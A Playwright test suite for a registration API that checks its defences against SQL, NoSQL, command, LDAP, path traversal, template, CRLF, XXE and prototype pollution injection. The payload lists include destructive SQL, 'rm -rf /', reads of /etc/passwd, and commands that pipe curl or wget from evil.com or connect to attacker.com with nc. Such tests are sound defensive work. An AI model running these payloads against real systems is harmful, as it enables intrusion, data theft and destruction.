import { test, expect } from '@playwright/test';
import { APITestClient } from '../../utils/api-test-client';
import { testDataGenerator } from '../../utils/test-data-generator';

/**
 * Injection Prevention API Tests
 * Verifies protection against SQL, NoSQL, Command, and LDAP injection attacks
 */

let apiClient: APITestClient;

test.beforeEach(async ({ request }) => {
  apiClient = new APITestClient(request);
});

test.describe('SQL Injection Prevention', () => {

  const sqlPayloads = [
    // Classic SQL injection
    "'; DROP TABLE registrations; --",
    "' OR '1'='1",
    "1' OR '1' = '1' --",
    "admin'--",
    "' UNION SELECT * FROM users--",
    "1'; DELETE FROM registrations WHERE '1'='1",
    "'; EXEC sp_MSForEachTable 'DROP TABLE ?'; --",

    // Time-based blind SQL injection
    "'; WAITFOR DELAY '00:00:10'; --",
    "1' AND SLEEP(5)--",
    "1' AND BENCHMARK(10000000,SHA1('test'))--",

    // Error-based SQL injection
    "' AND 1=CONVERT(int, (SELECT TOP 1 table_name FROM information_schema.tables))--",
    "' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--",

    // UNION-based SQL injection
    "' UNION SELECT NULL,NULL,NULL--",
    "' UNION ALL SELECT 1,2,3,4,5--",
    "' UNION SELECT username,password FROM users--",

    // Second-order SQL injection
    "admin'-- ",
    "test'); INSERT INTO users VALUES('hacker','pass')--",

    // Stacked queries
    "1; DROP TABLE users--",
    "1; INSERT INTO users VALUES('x','y')--",

    // Comments
    "test'/*",
    "test'-- -",
    "test'#",

    // Hex encoding
    "0x27204f5220273127203d2027312720",
    "CHAR(39) + 'OR' + CHAR(39) + '1' + CHAR(39) + '=' + CHAR(39) + '1'"
  ];

  test('SQLI-REG-001: SQL injection in first_name is prevented', async () => {
    for (const payload of sqlPayloads.slice(0, 8)) {
      const response = await apiClient.submitRegistration({
        first_name: payload,
        last_name: 'User',
        email: testDataGenerator.generateEmail(),
        invite_code: process.env.TEST_INVITE_CODE || ''
      });

      // Should not cause server error (indicates successful injection)
      expect(response.status).not.toBe(500);

      // If accepted, verify data integrity
      if (response.status === 201) {
        // Returned name should match input (escaped) or be sanitized
        expect(response.body.registration_id).toBeDefined();
      }
    }
  });

  test('SQLI-REG-002: SQL injection in email is prevented', async () => {
    const payloads = [
      "'; DROP TABLE users--@test.com",
      "test@test.com' OR '1'='1",
      "admin'--@test.com"
    ];

    for (const payload of payloads) {
      const response = await apiClient.submitRegistration({
        first_name: 'Test',
        last_name: 'User',
        email: payload,
        invite_code: process.env.TEST_INVITE_CODE || ''
      });

      // Should reject as invalid email or handle safely
      expect(response.status).not.toBe(500);
    }
  });

  test('SQLI-REG-003: SQL injection in invite_code is prevented', async () => {
    for (const payload of sqlPayloads.slice(0, 5)) {
      const response = await apiClient.submitRegistration({
        first_name: 'Test',
        last_name: 'User',
        email: testDataGenerator.generateEmail(),
        invite_code: payload
      });

      expect(response.status).not.toBe(500);
      expect(response.status).toBe(400); // Should reject as invalid code
    }
  });

  test('SQLI-REG-004: Time-based blind SQL injection detection', async () => {
    const startTime = Date.now();

    await apiClient.submitRegistration({
      first_name: "test' AND SLEEP(5)--",
      last_name: 'User',
      email: testDataGenerator.generateEmail(),
      invite_code: process.env.TEST_INVITE_CODE || ''
    });

    const elapsed = Date.now() - startTime;

    // If SLEEP(5) executed, response would take >5 seconds
    // Should respond quickly (under 3 seconds)
    expect(elapsed).toBeLessThan(3000);
  });
});

test.describe('NoSQL Injection Prevention', () => {

  const nosqlPayloads = [
    // MongoDB operators
    { "$gt": "" },
    { "$ne": null },
    { "$regex": ".*" },
    { "$where": "this.password.length > 0" },
    { "$or": [{ "admin": true }] },

    // String payloads that could be parsed as operators
    '{"$gt": ""}',
    '{"$ne": null}',
    '{"$or": [{"x": "y"}]}',
    '$where: function() { return true; }',
    "{ $gt: '' }",

    // JavaScript injection for MongoDB
    "'; return true; var dummy='",
    "function() { return true; }",
    "this.constructor.constructor('return this')()",
  ];

  test('NOSQLI-REG-001: NoSQL operator in first_name is prevented', async () => {
    for (const payload of nosqlPayloads) {
      const payloadStr = typeof payload === 'object' ? JSON.stringify(payload) : payload;

      const response = await apiClient.submitRegistration({
        first_name: payloadStr,
        last_name: 'User',
        email: testDataGenerator.generateEmail(),
        invite_code: process.env.TEST_INVITE_CODE || ''
      });

      expect(response.status).not.toBe(500);
    }
  });

  test('NOSQLI-REG-002: NoSQL operators as field values', async () => {
    // Send actual objects (not strings) to test JSON parsing
    const response = await apiClient.makeRequest('POST', '/register', {
      first_name: { "$ne": null },
      last_name: 'User',
      email: testDataGenerator.generateEmail(),
      invite_code: process.env.TEST_INVITE_CODE || ''
    });

    // Should reject type mismatch or handle safely
    expect(response.status).not.toBe(500);
  });

  test('NOSQLI-REG-003: Array with operators as field value', async () => {
    const response = await apiClient.makeRequest('POST', '/register', {
      first_name: [{ "$gt": "" }],
      last_name: 'User',
      email: testDataGenerator.generateEmail(),
      invite_code: process.env.TEST_INVITE_CODE || ''
    });

    expect(response.status).not.toBe(500);
  });
});

test.describe('Command Injection Prevention', () => {

  const cmdPayloads = [
    // Unix commands
    "; cat /etc/passwd",
    "| ls -la",
    "&& rm -rf /",
    "`whoami`",
    "$(curl http://evil.com)",
    "; ping -c 10 127.0.0.1",
    "| nc attacker.com 4444",
    "; wget http://evil.com/shell.sh",
    "&& curl http://evil.com | sh",

    // Windows commands
    "& dir",
    "| type C:\\Windows\\win.ini",
    "&& net user",

    // Backtick execution
    "`id`",
    "`uname -a`",

    // $() execution
    "$(id)",
    "$(cat /etc/passwd)",

    // Newline injection
    "test\n;ls",
    "test\r\nnet user",

    // Null byte injection
    "test\x00; rm -rf /",

    // Environment variable injection
    "${PATH}",
    "$HOME",
    "%PATH%"
  ];

  test('CMDI-REG-001: Command injection in first_name is prevented', async () => {
    for (const payload of cmdPayloads.slice(0, 10)) {
      const response = await apiClient.submitRegistration({
        first_name: payload,
        last_name: 'User',
        email: testDataGenerator.generateEmail(),
        invite_code: process.env.TEST_INVITE_CODE || ''
      });

      expect(response.status).not.toBe(500);
    }
  });

  test('CMDI-REG-002: Command injection in invite_code is prevented', async () => {
    for (const payload of cmdPayloads.slice(0, 5)) {
      const response = await apiClient.submitRegistration({
        first_name: 'Test',
        last_name: 'User',
        email: testDataGenerator.generateEmail(),
        invite_code: payload
      });

      expect(response.status).not.toBe(500);
    }
  });

  test('CMDI-REG-003: Backtick execution is prevented', async () => {
    const response = await apiClient.submitRegistration({
      first_name: '`id`',
      last_name: '$(whoami)',
      email: testDataGenerator.generateEmail(),
      invite_code: process.env.TEST_INVITE_CODE || ''
    });

    expect(response.status).not.toBe(500);
  });
});

test.describe('LDAP Injection Prevention', () => {

  const ldapPayloads = [
    // LDAP injection
    "*)(objectClass=*",
    "admin)(&)",
    "*()|(&(objectClass=*))",
    "*)(uid=*))(|(uid=*",
    "admin)(|(password=*))",
    "\\00",  // Null byte
    "*)(objectClass=user)(memberOf=CN=Admin",

    // LDAP operator injection
    ")(|(cn=*",
    "admin)(!(&(1=0",
    "*))(|(objectClass=*"
  ];

  test('LDAPI-REG-001: LDAP injection in fields is prevented', async () => {
    for (const payload of ldapPayloads.slice(0, 5)) {
      const response = await apiClient.submitRegistration({
        first_name: payload,
        last_name: 'User',
        email: testDataGenerator.generateEmail(),
        invite_code: process.env.TEST_INVITE_CODE || ''
      });

      expect(response.status).not.toBe(500);
    }
  });

  test('LDAPI-REG-002: LDAP wildcards are handled', async () => {
    const response = await apiClient.submitRegistration({
      first_name: '*',
      last_name: '**',
      email: testDataGenerator.generateEmail(),
      invite_code: process.env.TEST_INVITE_CODE || ''
    });

    expect(response.status).not.toBe(500);
  });
});

test.describe('Path Traversal Prevention', () => {

  const pathPayloads = [
    "../../../etc/passwd",
    "..\\..\\..\\windows\\system32",
    "....//....//....//etc/passwd",
    "..%2F..%2F..%2Fetc%2Fpasswd",
    "..%252F..%252F..%252Fetc%252Fpasswd",
    "..%c0%af..%c0%af..%c0%afetc/passwd",
    ".../.../.../etc/passwd",
    "....\\\\....\\\\etc\\\\passwd"
  ];

  test('PATH-REG-001: Path traversal in fields is prevented', async () => {
    for (const payload of pathPayloads) {
      const response = await apiClient.submitRegistration({
        first_name: payload,
        last_name: 'User',
        email: testDataGenerator.generateEmail(),
        invite_code: process.env.TEST_INVITE_CODE || ''
      });

      expect(response.status).not.toBe(500);
    }
  });

  test('PATH-REG-002: Path traversal in invite_code is prevented', async () => {
    for (const payload of pathPayloads.slice(0, 3)) {
      const response = await apiClient.submitRegistration({
        first_name: 'Test',
        last_name: 'User',
        email: testDataGenerator.generateEmail(),
        invite_code: payload
      });

      expect(response.status).not.toBe(500);
      expect(response.status).toBe(400);
    }
  });
});

test.describe('Template Injection Prevention', () => {

  const templatePayloads = [
    // Server-side template injection
    "{{7*7}}",
    "${7*7}",
    "<%= 7*7 %>",
    "#{7*7}",
    "*{7*7}",
    "@(7*7)",
    "{{constructor.constructor('return this')()}}",
    "{{config}}",
    "${T(java.lang.Runtime).getRuntime().exec('id')}",
    "{{''.__class__.__mro__[2].__subclasses__()}}",

    // Expression language injection
    "${applicationScope}",
    "${pageContext}",
    "#{request.getClass()}"
  ];

  test('SSTI-REG-001: Template injection in fields is prevented', async () => {
    for (const payload of templatePayloads.slice(0, 5)) {
      const response = await apiClient.submitRegistration({
        first_name: payload,
        last_name: 'User',
        email: testDataGenerator.generateEmail(),
        invite_code: process.env.TEST_INVITE_CODE || ''
      });

      expect(response.status).not.toBe(500);

      // If accepted, verify template wasn't executed
      if (response.status === 201 && response.body.first_name) {
        // "{{7*7}}" should NOT become "49"
        expect(response.body.first_name).not.toBe('49');
      }
    }
  });
});

test.describe('Header Injection Prevention', () => {

  test('HEADERI-REG-001: CRLF injection in email is prevented', async () => {
    const crlfPayloads = [
      "test@test.com\r\nX-Injected: header",
      "test@test.com%0d%0aX-Injected: header",
      "test@test.com\r\n\r\n<html>",
    ];

    for (const payload of crlfPayloads) {
      const response = await apiClient.submitRegistration({
        first_name: 'Test',
        last_name: 'User',
        email: payload,
        invite_code: process.env.TEST_INVITE_CODE || ''
      });

      expect(response.status).not.toBe(500);
      expect(response.status).toBe(400); // Invalid email
    }
  });

  test('HEADERI-REG-002: CRLF injection in names is handled', async () => {
    const response = await apiClient.submitRegistration({
      first_name: "Test\r\nX-Injected: header",
      last_name: 'User',
      email: testDataGenerator.generateEmail(),
      invite_code: process.env.TEST_INVITE_CODE || ''
    });

    expect(response.status).not.toBe(500);
  });
});

test.describe('XML/XXE Injection Prevention', () => {

  const xxePayloads = [
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
    '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/xxe">]>',
    '<!ENTITY % xxe SYSTEM "file:///etc/passwd">',
    '<![CDATA[<script>alert(1)</script>]]>'
  ];

  test('XXE-REG-001: XXE payloads in fields are handled', async () => {
    for (const payload of xxePayloads) {
      const response = await apiClient.submitRegistration({
        first_name: payload,
        last_name: 'User',
        email: testDataGenerator.generateEmail(),
        invite_code: process.env.TEST_INVITE_CODE || ''
      });

      expect(response.status).not.toBe(500);
    }
  });
});

test.describe('Prototype Pollution Prevention', () => {

  test('PROTO-REG-001: __proto__ injection is prevented', async () => {
    const response = await apiClient.makeRequest('POST', '/register', {
      first_name: 'Test',
      last_name: 'User',
      email: testDataGenerator.generateEmail(),
      invite_code: process.env.TEST_INVITE_CODE || '',
      __proto__: { admin: true }
    });

    expect(response.status).not.toBe(500);
  });

  test('PROTO-REG-002: constructor.prototype injection is prevented', async () => {
    const response = await apiClient.makeRequest('POST', '/register', {
      first_name: 'Test',
      last_name: 'User',
      email: testDataGenerator.generateEmail(),
      invite_code: process.env.TEST_INVITE_CODE || '',
      "constructor": { "prototype": { "admin": true } }
    });

    expect(response.status).not.toBe(500);
  });
});
